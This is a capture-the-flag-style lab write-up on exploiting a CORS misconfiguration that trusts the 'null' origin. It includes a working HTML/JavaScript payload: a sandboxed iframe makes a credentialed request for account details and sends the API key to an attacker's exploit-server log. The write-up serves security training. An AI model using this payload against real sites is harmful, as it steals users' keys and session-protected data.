# Lab: CORS vulnerability with trusted null origin

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0b051784-8eb8-4bd0-8204-ba326489a426)

## Solution

Log in using the given username and password.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/bfb2632c-0b16-4fef-b5aa-9a71ffdf3f3d)

The apikey is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/261496e2-a890-4581-81db-aacb6209612c)

Send the request to Burp Repeater, and resubmit it with the added header `Origin` with some random web address . The eb address is not reflected in the `Access-Control-Allow-Origin` header.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/80d8b0c1-0ec9-47f5-ae96-64403b6e0d2d)

Resubmit it by changing header `Origin: null`. The "null" origin is reflected in the `Access-Control-Allow-Origin` header.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4420bda9-9c0b-4bb5-984f-a49fe23afce2)

Go to exploit server and in the body section paste the following HTML.

```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

Click on store and then deliver to victim.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/815520ef-6f47-4fb6-8291-878c6543c8c0)

The apikey will be in the url.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/39f200cb-b28c-48a5-aeed-e6c5069d20e4)

Paste the apikey in the **Submit Solution** section and finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3b12fbea-2bf2-442a-8781-e45fd47922d9)
